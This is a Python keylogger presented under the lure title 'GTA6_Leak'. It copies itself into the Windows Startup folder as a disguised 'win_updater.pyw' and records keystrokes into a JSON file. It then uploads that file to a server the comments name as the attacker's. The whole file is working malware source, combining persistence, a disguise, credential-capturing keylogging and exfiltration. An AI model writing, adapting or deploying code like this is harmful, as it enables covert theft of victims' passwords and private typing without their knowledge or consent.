# GTA6_Leak

import os
import json
import requests
import shutil
from pynput import keyboard
from pathlib import Path

# -------------- ADD TO STARTUP SECTION --------------
def add_to_startup():
    startup_dir = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
    script_path = os.path.realpath(_file) 
    target_path = os.path.join(startup_dir, "win_updater.pyw")  # disguise the name

    if not os.path.exists(target_path):
        shutil.copy(script_path, target_path)
        print("[+] Added to startup.")
    else:
        print("[=] Already in startup.")

add_to_startup()

key_list = []
x = False
log_file = 'logs.json'
START_LOGGING = False

# ✅ Update this to your attacker's IP
ATTACKER_SERVER = 'http://192.168.1.71:5000/upload'


def send_logs():
    try:
        with open(log_file, 'rb') as f:
            files = {'logfile': f}
            response = requests.post(ATTACKER_SERVER, files=files)
            print(f"[*] Sent log to attacker. Status code: {response.status_code}")
    except Exception as e:
        print(f"[!] Failed to send logs: {e}")


def update_json_file(key_list):
    with open(log_file, 'wb+') as key_log:
        key_log.write(json.dumps(key_list, indent=4).encode())
    send_logs()


def on_press(key):
    global x, START_LOGGING
    if key == keyboard.Key.f9:
        START_LOGGING = True
        print("[*] Logging activated.")

    if START_LOGGING:
        if not x:
            key_list.append({'Pressed': f'{key}'})
            x = True
        else:
            key_list.append({'Held': f'{key}'})
        update_json_file(key_list)


def on_release(key):
    global x
    if key == keyboard.Key.esc:
        print("[!] ESC pressed — exiting keylogger.")
        os._exit(0)

    if START_LOGGING:
        key_list.append({'Released': f'{key}'})
        update_json_file(key_list)

    x = False


# ✅ Start the keylogger listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
